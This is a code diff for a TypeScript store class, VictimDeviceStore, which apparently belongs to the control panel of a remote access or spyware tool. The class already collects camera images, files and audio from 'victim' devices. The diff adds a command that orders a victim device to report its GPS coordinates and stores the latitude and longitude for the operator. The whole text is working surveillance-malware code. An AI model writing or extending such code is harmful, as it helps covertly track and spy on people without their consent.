@@ -44,6 +44,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
     public imageDataUrl: string | null = null;
     public files: FileListItem[] = [];
     public audioDataUrl: string | null = null;
+    public location: [number, number] | null = null;
 
     public constructor(input: IBaseEntity & IVictim) {
         this.id = input.id;
@@ -69,16 +70,18 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
         this.setupListeners();
 
         makeObservable(this, {
+            audioDataUrl: observable,
             cameras: observable,
             connectionStatus: observable,
-            imageDataUrl: observable,
             files: observable,
-            audioDataUrl: observable,
+            imageDataUrl: observable,
+            location: observable,
             open: observable,
+            setAudio: action,
             setCameras: action,
             setFiles: action,
             setImage: action,
-            setAudio: action,
+            setLocation: action,
             setOpen: action,
             setConnectionStatus: action,
         });
@@ -166,6 +169,12 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
 
             this.setAudio(Buffer.from(data.buffer));
         });
+
+        this.socket.on(VictimOrder.LOCATION, (data) => {
+            console.log(`[VICTIM] Location from ${this.deviceId}`, data);
+
+            this.setLocation([data.lat, data.lng]);
+        });
     }
 
     public listCameras(): void {
@@ -205,6 +214,12 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
         });
     }
 
+    public fetchLocation(): void {
+        this.socket.emit(ServerToVictimEvents.VICTIM_ORDER, {
+            order: VictimOrder.LOCATION,
+        });
+    }
+
     public setAudio(audio: Buffer | null): void {
         this.audioDataUrl =
             audio !== null ? bufferToDataUrl(audio, 'audio/mp3') : null;
@@ -228,6 +243,10 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
 
     public setImage(image: Buffer | null): void {
         this.imageDataUrl = image !== null ? bufferToDataUrl(image) : null;
+    }
+
+    public setLocation(location: [number, number] | null): void {
+        this.location = location;
     }
 
     public setOpen(open: boolean): void {
